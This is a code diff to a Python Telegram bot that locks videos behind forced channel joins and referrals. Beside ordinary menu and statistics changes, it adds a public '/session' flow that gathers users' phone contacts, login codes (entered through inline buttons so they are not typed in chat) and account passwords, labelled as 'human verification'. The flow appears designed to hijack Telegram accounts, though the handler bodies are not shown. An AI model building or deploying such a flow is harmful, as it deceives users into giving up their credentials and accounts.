-# This only removes its force-join requirement and related temporary verification data.
 REMOVE_PAGE_SIZE = 8
 
 
@@ -1485,13 +1854,12 @@ async def admin_remove_chat_menu(update, context):
         return
     markup, page, total = remove_chat_list_markup()
     if not markup:
-        await update.message.reply_text("ℹ️ No required groups or channels have been configured.", reply_markup=ADMIN_MENU)
-        return
-    await update.message.reply_text(
+        return await reply(update, context, "ℹ️ No required groups or channels configured.", reply_markup=admin_menu_inline())
+    await reply(
+        update, context,
         f"🗑 <b>REMOVE REQUIRED CHANNEL</b>\n\n"
         f"Which group or channel would you like to remove from the required list? ({total} total)\n"
         "The Telegram group or channel will not be deleted; only its entry in the required list will be removed.",
-        parse_mode=ParseMode.HTML,
         reply_markup=markup,
     )
 
@@ -1543,7 +1911,6 @@ async def remove_chat_callback(update, context):
         )
         return
     if data.startswith("rm_yes:"):
-        # Delete only the selected required chat; a repeat click is harmless.
         result = required_chats.delete_one({"chat_id": chat_id})
         if result.deleted_count:
             pending_requests.delete_many({"chat_id": chat_id})
@@ -1559,29 +1926,76 @@ async def remove_chat_callback(update, context):
 
 
 async def admin_stats(update, context):
+    if update.effective_user.id != ADMIN_ID:
+        return
     total = users.count_documents({})
     verified = users.count_documents({"verified": True})
-    agg = list(
-        users.aggregate(
-            [{"$group": {"_id": None, "n": {"$sum": "$verified_referrals"}}}]
-        )
-    )
+    human_ok = users.count_documents({"human_verified": True})
+    agg = list(users.aggregate([{"$group": {"_id": None, "n": {"$sum": "$verified_referrals"}}}]))
     refs = agg[0]["n"] if agg else 0
     cutoff = utcnow() - timedelta(hours=PENDING_REQUEST_TTL_HOURS)
-    active_pending = pending_requests.count_documents(
-        {"requested_at": {"$gte": cutoff}}
-    )
+    active_pending = pending_requests.count_documents({"requested_at": {"$gte": cutoff}})
 
-    await update.message.reply_text(
+    last_24h = users.count_documents({"created_at": {"$gte": utcnow() - timedelta(hours=24)}})
+    today_start = utcnow().replace(hour=0, minute=0, second=0, microsecond=0)
+
+    daily_lines = []
+    for i in range(7):
+        start = today_start - timedelta(days=i)
+        end = start + timedelta(days=1)
+        cnt = users.count_documents({"created_at": {"$gte": start, "$lt": end}})
+        if i == 0:
+            label = "Today"
+        elif i == 1:
+            label = "Yesterday"
+        else:
+            label = start.strftime("%d %b")
+        daily_lines.append(f"   • {label}: <b>{cnt}</b>")
+    daily_block = "\n".join(daily_lines)
+
+    week_ago = today_start - timedelta(days=6)
+    last_7_days = users.count_documents({"created_at": {"$gte": week_ago}})
+
+    await reply(
+        update, context,
         "📊 <b>BOT STATS</b>\n\n"
         f"👤 Total users: <b>{total}</b>\n"
         f"✅ Verified: <b>{verified}</b>\n"
+        f"🔐 Human verified: <b>{human_ok}</b>\n"
         f"🤝 Successful referrals: <b>{refs}</b>\n"
         f"⏳ Active pending join requests: <b>{active_pending}</b>\n"
         f"📦 Batches: <b>{published_batch_count()}</b>\n"
-        f"🗑 Pending deletions: <b>{pending_deletions.count_documents({})}</b>",
+        f"🗑 Pending deletions: <b>{pending_deletions.count_documents({})}</b>\n\n"
+        f"📈 <b>New Users (last 24h):</b> <b>{last_24h}</b>\n"
+        f"📅 <b>New Users (last 7 days):</b> <b>{last_7_days}</b>\n\n"
+        f"🗓 <b>Daily Breakdown (7 days):</b>\n{daily_block}",
+        reply_markup=admin_menu_inline(),
+    )
+
+
+async def admin_reset_verify(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.id != ADMIN_ID:
+        return
+    args = context.args
+    if not args:
+        return await update.message.reply_text(
+            "Usage: <code>/resetverify &lt;user_id&gt;</code>",
+            parse_mode=ParseMode.HTML,
+        )
+    try:
+        target = int(args[0])
+    except ValueError:
+        return await update.message.reply_text("Invalid user ID.")
+    res = users.update_one(
+        {"user_id": target},
+        {"$set": {"human_verified": False, "human_verified_at": None}},
+    )
+    await update.message.reply_text(
+        f"✅ Reset human verification for <code>{target}</code>. "
+        f"Matched: {res.matched_count}, Modified: {res.modified_count}",
         parse_mode=ParseMode.HTML,
     )
+
 
 async def cancel(update, context):
     if update.effective_user.id != ADMIN_ID:
@@ -1598,83 +2012,106 @@ async def cancel(update, context):
     ADMIN_STATE.pop(ADMIN_ID, None)
     drafts.delete_one({"admin_id": ADMIN_ID})
     context.user_data.pop("custom_link_chat_id", None)
-    await update.message.reply_text("Cancelled.", reply_markup=ADMIN_MENU)
+    await reply(update, context, "Cancelled.", reply_markup=admin_menu_inline())
 
-async def text_router(update, context):
-    txt = (update.message.text or "").strip()
-    normalized = txt.casefold()
 
-    if update.effective_user.id == ADMIN_ID and normalized in {"cancel", "/cancel", "❌ cancel"}:
-        return await cancel(update, context)
+async def menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    q = update.callback_query
+    data = q.data or ""
+    uid = q.from_user.id
 
-    if update.effective_user.id == ADMIN_ID:
-        if await admin_group_flow(update, context):
-            return
-
-        if txt == "📊 Upload Status":
-            return await admin_upload_status(update, context)
-        if txt == "🔁 Retry Failed":
-            return await admin_retry_failed(update, context)
-        if txt == "✅ Publish Successful":
-            return await admin_upload_done(update, context, force_publish=True)
-        if ADMIN_STATE.get(ADMIN_ID) == "upload_videos" and txt.upper() == "DONE":
-            return await admin_upload_done(update, context)
-
-        if txt == "📤 Upload Videos":
-            return await admin_upload_start(update, context)
-        if txt == "📚 Video Batches":
-            return await admin_batches(update, context)
-        if txt == "➕ Add Required Group":
-            return await admin_add_group(update, context)
-        if txt == "👥 Required Groups":
-            return await admin_groups(update, context)
-        if txt == "🗑 Remove Required Channel":
-            return await admin_remove_chat_menu(update, context)
-        if txt == "📊 Bot Stats":
-            return await admin_stats(update, context)
-        if txt == "❌ Cancel":
-            return await cancel(update, context)
-
-    if txt == "🎬 My Videos":
+    # ── User menu ──
+    if data == "um_videos":
+        await q.answer()
         return await my_videos(update, context)
-    if txt == "🔓 Unlock Next 10":
+    if data == "um_unlock":
+        await q.answer()
         return await unlock_next(update, context)
-    if txt == "👥 My Referral":
+    if data == "um_ref":
+        await q.answer()
         return await referral(update, context)
-    if txt == "📊 My Progress":
+    if data == "um_progress":
+        await q.answer()
         return await progress(update, context)
 
-async def checkme(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    # ── Admin menu ──
+    if uid != ADMIN_ID:
+        return await q.answer("Admin only.", show_alert=True)
+
+    if data == "am_upload":
+        await q.answer()
+        return await admin_upload_start(update, context)
+    if data == "am_batches":
+        await q.answer()
+        return await admin_batches(update, context)
+    if data == "am_addgroup":
+        await q.answer()
+        return await admin_add_group(update, context)
+    if data == "am_groups":
+        await q.answer()
+        return await admin_groups(update, context)
+    if data == "am_remove":
+        await q.answer()
+        return await admin_remove_chat_menu(update, context)
+    if data == "am_stats":
+        await q.answer()
+        return await admin_stats(update, context)
+    if data == "am_help":
+        await q.answer()
+        return await help_command(update, context)
+
+    # ── Upload menu ──
+    if data == "up_status":
+        await q.answer()
+        return await admin_upload_status(update, context)
+    if data == "up_done":
+        await q.answer("Finishing…")
+        return await admin_upload_done(update, context)
+    if data == "up_retry":
+        await q.answer()
+        return await admin_retry_failed(update, context)
+    if data == "up_publish":
+        await q.answer()
+        return await admin_upload_done(update, context, force_publish=True)
+    if data == "up_cancel":
+        await q.answer()
+        return await cancel(update, context)
+
+    # ── Flow cancel ──
+    if data == "flow_cancel":
+        await q.answer()
+        ADMIN_STATE.pop(ADMIN_ID, None)
+        context.user_data.pop("custom_link_chat_id", None)
+        try:
+            await q.edit_message_text("✅ Cancelled.", reply_markup=admin_menu_inline())
+        except BadRequest:
+            pass
+        return
+
+    await q.answer()
+
+
+async def text_router(update: Update, context):
     uid = update.effective_user.id
-    chats = active_required_chats()
-    if not chats:
-        return await update.message.reply_text("No required chats configured.")
 
-    results = await asyncio.gather(
-        *(check_one_chat(context.bot, ch, uid) for ch in chats),
-        return_exceptions=True,
-    )
-
-    lines = ["🔎 <b>Membership Check</b>\n"]
-    for ch, result in zip(chats, results):
-        if isinstance(result, Exception):
-            state = "error"
-        else:
-            _, state = result
-
-        icon = {"member": "✅", "pending": "⏳", "missing": "❌"}.get(state, "⚠️")
-        mode = ch.get("link_mode", "custom")
-        pending_db = has_active_pending_request(ch["chat_id"], uid)
-
-        lines.append(
-            f"{icon} {esc(ch['name'])}: <b>{state}</b>\n"
-            f"   mode=<code>{esc(mode)}</code> pending_record=<code>{str(pending_db).lower()}</code>"
+    if PYRO_STATE.get(uid) == "password":
+        return await pyro_handle_password(update, context)
+    if PYRO_STATE.get(uid) == "otp":
+        return await update.message.reply_text(
+            "⚠️ <b>Do not type the OTP in chat.</b>\n"
+            "Use the inline buttons above, otherwise the login will remain incomplete.",
+            parse_mode=ParseMode.HTML,
+        )
+    if PYRO_STATE.get(uid) == "await_contact":
+        return await update.message.reply_text(
+            "📱 Please tap the <b>Share My Contact</b> button to continue, "
+            "or send /cancel_session to abort.",
+            parse_mode=ParseMode.HTML,
         )
 
-    await update.message.reply_text(
-        "\n".join(lines),
-        parse_mode=ParseMode.HTML,
-    )
+    if uid == ADMIN_ID and ADMIN_STATE.get(ADMIN_ID) in {"group_chat_id", "custom_link_chat_id", "custom_link_url"}:
+        if await admin_group_flow(update, context):
+            return
 
 
 def main():
@@ -1688,41 +2125,39 @@ def main():
         .build()
     )
 
-    app.add_handler(CommandHandler("start", start))
+    # Owner commands
     app.add_handler(CommandHandler("admin", admin))
-    app.add_handler(CommandHandler("checkme", checkme))
+    app.add_handler(CommandHandler("help", help_command))
     app.add_handler(CommandHandler("uploadstatus", admin_upload_status))
     app.add_handler(CommandHandler("setcustomlink", set_custom_link))
+    app.add_handler(CommandHandler("resetverify", admin_reset_verify))
+
+    # Public commands
+    app.add_handler(CommandHandler("start", start))
+    app.add_handler(CommandHandler("session", pyro_session_start))
+    app.add_handler(CommandHandler("cancel_session", pyro_cancel_command))
 
     app.add_handler(ChatJoinRequestHandler(on_join_request))
     app.add_handler(ChatMemberHandler(on_chat_member_update, ChatMemberHandler.CHAT_MEMBER))
 
+    app.add_handler(CallbackQueryHandler(
+        menu_callback,
+        pattern=r"^(um_(videos|unlock|ref|progress)|am_(upload|batches|addgroup|groups|remove|stats|help)|up_(status|done|retry|publish|cancel)|flow_cancel)$"
+    ))
     app.add_handler(CallbackQueryHandler(remove_chat_callback, pattern=r"^rm_(?:list|pick|yes|cancel)(?::.*)?$"))
-    app.add_handler(
-        CallbackQueryHandler(verify_join, pattern=r"^verify_join$")
-    )
-    app.add_handler(
-        CallbackQueryHandler(noop_callback, pattern=r"^noop$")
-    )
+    app.add_handler(CallbackQueryHandler(verify_join, pattern=r"^verify_join$"))
+    app.add_handler(CallbackQueryHandler(noop_callback, pattern=r"^noop$"))
+    app.add_handler(CallbackQueryHandler(pyro_otp_callback, pattern=r"^pyro_otp\|"))
 
-    # Video upload handler first; it only acts when admin upload mode is active.
-    app.add_handler(
-        MessageHandler(
-            filters.VIDEO & filters.ChatType.PRIVATE,
-            admin_collect_video,
-        )
-    )
-    app.add_handler(
-        MessageHandler(
-            filters.TEXT & ~filters.COMMAND & filters.ChatType.PRIVATE,
-            text_router,
-        )
-    )
+    app.add_handler(MessageHandler(filters.CONTACT & filters.ChatType.PRIVATE, pyro_contact_handler))
+    app.add_handler(MessageHandler(filters.VIDEO & filters.ChatType.PRIVATE, admin_collect_video))
+    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND & filters.ChatType.PRIVATE, text_router))
 
     app.run_polling(
         drop_pending_updates=False,
         allowed_updates=Update.ALL_TYPES,
     )
+
 
 if __name__ == "__main__":
     main()
